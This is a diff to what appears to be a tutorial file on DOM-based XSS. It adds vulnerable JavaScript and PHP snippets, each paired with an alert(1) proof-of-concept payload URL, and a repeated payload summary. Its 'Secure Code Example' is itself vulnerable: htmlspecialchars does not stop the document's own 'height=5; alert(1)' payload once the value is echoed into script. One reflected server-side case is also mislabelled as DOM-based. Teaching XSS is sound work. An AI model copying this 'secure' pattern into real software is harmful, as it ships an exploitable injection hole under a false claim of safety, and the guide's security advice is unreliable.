@@ -3,32 +3,141 @@ DOM-based XSS is a type of attack that occurs when a web page's client-side scri
 
 These attacks occur when client-side JavaScript processes data from untrusted sources and then interprets that data in a way that allows code execution. This typically involves functions such as eval() or innerHTML, which can execute or modify HTML and JavaScript code.
 
-var userInput = 'console.log(1)';
-eval(userInput); // output : 1
+-- DOM-based XSS Attack Examples --
+
+➜ Injecting Script from URL Fragment to DOM
+
+Source Code: document.getElementById('output').innerHTML = window.location.hash.substring(1);
+Payload: https://example.com#<script>alert(1)</script>
+
+➜ Using eval Function to Execute XSS
+
+Source Code:
+
+window.onload = function() {
+    const productId = new URLSearchParams(window.location.search).get('id');
+    eval('getProduct('+ productId.toString()+')');
+}
+
+Payload: https://example.com/products?id=');alert(1)//
+
+➜ XSS Using innerHTML
+
+Source Code: document.getElementById('content').innerHTML = unescape(location.search.substring(1));
+Payload: https://example.com?%3Cscript%3Ealert(1)%3C/script%3E
+
+➜ Using onerror Event for XSS
+
+Source Code:
+
+<img src="" id="image">
+<script>
+  document.getElementById('image').src = location.hash.substring(1);
+</script>
+
+Payload: https://example.com#invalid-image" onerror="alert(1)
+
+➜ Implementing a DOM-based XSS Attack
+
+Source Code:
+
+<script>
+  var height = 5;
+  var base = 12;
+  var ans = base * height / 2;
+  document.getElementById("answer").innerHTML = "<b>Area:</b> " + ans;
+</script>
+
+Payload: https://example.com/?height=5&base=12
+
+https://example.com/?height=5; alert(1)&base=12
+
+<script>
+  var height = 5;alert(1);
+  var base = 12;
+  var ans = base * height / 2;
+  document.getElementById("answer").innerHTML = "<b>Area:</b> " + ans;
+</script>
+
+➜ Vulnerable Code Example
+
+<?php
+    if (isset($_GET['base']) && isset($_GET['height'])) {
+        echo '<div class="alert alert-success" id="answer"></div>';
+        echo '<script>';
+        echo 'var height = ' . $_GET['height'] . ';';
+        echo 'var base = ' . $_GET['base'] . ';';
+        echo 'var ans = base * height / 2;';
+        echo 'document.getElementById("answer").innerHTML = "<b>Area:</b> " + ans;';
+        echo '</script>';
+    }
+?>
+
+➜ Secure Code Example
+
+<?php
+    if (isset($_GET['base']) && isset($_GET['height'])) {
+        $base = htmlspecialchars($_GET['base'], ENT_QUOTES, 'UTF-8');
+        $height = htmlspecialchars($_GET['height'], ENT_QUOTES, 'UTF-8');
+
+        echo '<div class="alert alert-success" id="answer"></div>';
+        echo '<script>';
+        echo 'var height = ' . $height . ';';
+        echo 'var base = ' . $base . ';';
+        echo 'var ans = base * height / 2;';
+        echo 'document.getElementById("answer").innerHTML = "<b>Area:</b> " + ans;';
+        echo '</script>';
+    }
+?>
+
+
+-- Payload Summarization --
+
+Source Code: document.getElementById('output').innerHTML = window.location.hash.substring(1);
+Payload: https://example.com#<script>alert(1)</script>
+
+-----------------------------------------------------------
+
+Source Code:
+
+window.onload = function() {
+    const productId = new URLSearchParams(window.location.search).get('id');
+    eval('getProduct('+ productId.toString()+')');
+}
+
+Payload: https://example.com/products?id=');alert(1)//
+
+-----------------------------------------------------------
+
+Source Code: document.getElementById('content').innerHTML = unescape(location.search.substring(1));
+Payload: https://example.com?%3Cscript%3Ealert(1)%3C/script%3E
+
+-----------------------------------------------------------
+
+Source Code:
+
+<img src="" id="image">
+<script>
+  document.getElementById('image').src = location.hash.substring(1);
+</script>
+
+Payload: https://example.com#invalid-image" onerror="alert(1)
+
+-----------------------------------------------------------
+
+Source Code:
+
+<script>
+  var height = 5;
+  var base = 12;
+  var ans = base * height / 2;
+  document.getElementById("answer").innerHTML = "<b>Area:</b> " + ans;
+</script>
+
+Payload: https://example.com/?height=5&base=12
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-var userInput = 'console.log(1)';
-eval(userInput); // output : 1
-
-
+*
 
 *
